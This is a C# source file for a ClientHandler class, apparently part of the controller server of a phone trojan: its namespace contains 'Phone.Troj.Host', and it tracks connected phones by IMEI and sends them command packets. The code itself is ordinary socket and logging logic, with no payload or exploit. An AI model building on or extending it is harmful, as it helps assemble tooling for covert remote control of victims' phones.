using System;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;
using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class ClientHandler
    {
        private string imei;
        private readonly Socket clientSocket;
        private readonly Receiver receiver;
        private readonly Server server;
        private readonly ILog log;
        private readonly Demux demux;
        private readonly Mux mux;
        private Stream buffer;
        private bool connected;
        private readonly IMainView mainGUI;

        public ClientHandler(Socket yourSocket, string id, Server s, ILog log, IMainView mainGUI)
        {
            this.mainGUI = mainGUI;
            server = s;
            this.log = log;
            imei = id;
            clientSocket = yourSocket;
            receiver = new Receiver(clientSocket);
            demux = new Demux(server, imei);
            mux = new Mux(new NetworkStream(clientSocket));
            connected = true;

            buffer = new MemoryStream(Protocol.MaxPacketSize);

        }

        
        public void Run()
        {
            while (connected)
            {

                try
                {
                    buffer = receiver.Read(buffer);
                    try
                    {
                        demux.Receive(buffer);
                    }
                    catch (Exception e)
                    {
                        connected = false;
                        log.LogErrTxt("ERROR: while deconding received stream (Demux) : " + e.Message);
                    }

                }
                catch (IOException e)
                {
                    connected = false;
                    try
                    {

                        clientSocket.Close();
                        mainGUI.DeleteUser(imei);
                    }
                    catch (IOException e1)
                    {
                        log.LogErrTxt("ERROR: while reading from a socket(Receiver)");
                    }
                }
                catch (Exception)
                {
                    log.LogErrTxt("Client ended gently !");
                    connected = false;
                    try
                    {
                        clientSocket.Close();
                        mainGUI.DeleteUser(imei);
                    }
                    catch (IOException e1)
                    {
                        log.LogErrTxt("Cannot close socket when socket client closed it before");
                    }
                }
            }
            server.DeleteClientHandler(imei);
        }
        
        public void ToMux(short command, int channel, byte[] args)
        {
            IPacket packet = new CommandPacket(command, channel, args);
            mux.Send(0, packet.Build());
        }

        public void UpdateIMEI(string i)
        {
            imei = i;
            demux.Imei = imei;
        }

        public void Start()
        {
            new Task(Run).Start();
        }
    }

}
